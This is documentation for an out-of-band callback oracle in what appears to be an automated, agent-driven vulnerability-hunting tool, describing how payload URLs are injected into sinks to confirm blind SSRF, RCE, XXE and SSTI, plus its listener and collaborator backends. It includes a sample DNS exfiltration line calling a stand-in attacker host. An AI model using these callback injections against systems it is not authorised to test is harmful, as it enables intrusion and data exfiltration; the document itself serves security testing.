# OOB interaction oracle (`agent/oob_oracle.py`)

Proof for **blind** vulnerabilities — blind SSRF / RCE / XXE / SSTI, where there
is no response to read. The only ground truth is a callback from the target's
own infrastructure to a host you control, correlated by a unique nonce. The
oracle mints that nonce + payload URL, catches the callback, and on a
correlated hit registers a verified `oob` proof token so the finding passes the
[proof gate](proof-gate.md).

## Flow (hunter tools)

```
oob_probe(label="ssrf /redirect.php?url")   → {probe_id, payload_url}
# inject payload_url into the sink, e.g. send_http_request(url="...?url=<payload_url>")
oob_check(probe_id)   → {fired: true, events: [...], proof: "oob verified"}
```

`fired: true` means server-side code reached your host — that call registers the
proof token. No callback → the finding stays NEEDS_EVIDENCE.

## Backends (`AEGIS_OOB_BACKEND`)

| Backend | Value | Notes |
|---|---|---|
| `LocalListenerBackend` (default) | `local` | In-process threaded HTTP listener; mints `/oob/<nonce>` URLs. Proves **HTTP-based** OOB (SSRF, RCE via curl/wget) whenever the target can reach this host — benchmarks on a shared Docker network, or set `AEGIS_OOB_PUBLIC_BASE` to a public address that forwards here. No external service; fully tested. |
| `RemoteCollaboratorBackend` | `remote` | Polls an operator-run collaborator (interactsh / Burp Collaborator / webhook) via `AEGIS_OOB_POLL_URL` (`?id=<nonce>` → JSON events) with callback domain `AEGIS_OOB_PUBLIC_BASE`. Needed for internet targets and **DNS-only** callbacks. Raises if unconfigured rather than silently never firing. |

## Config

- `AEGIS_OOB_PUBLIC_BASE` — the base URL/domain payloads should hit. For the
  local backend, defaults to `http://<listener-host>:<port>`; set it when the
  target reaches this host under a different address.
- `AEGIS_OOB_POLL_URL`, `AEGIS_OOB_TOKEN` — remote collaborator poll endpoint
  and optional bearer token.

## Scope note

The local listener catches HTTP callbacks. DNS-only exfiltration (e.g.
`nslookup <nonce>.attacker`) does not reach an HTTP listener — use the remote
backend against a collaborator that records DNS.
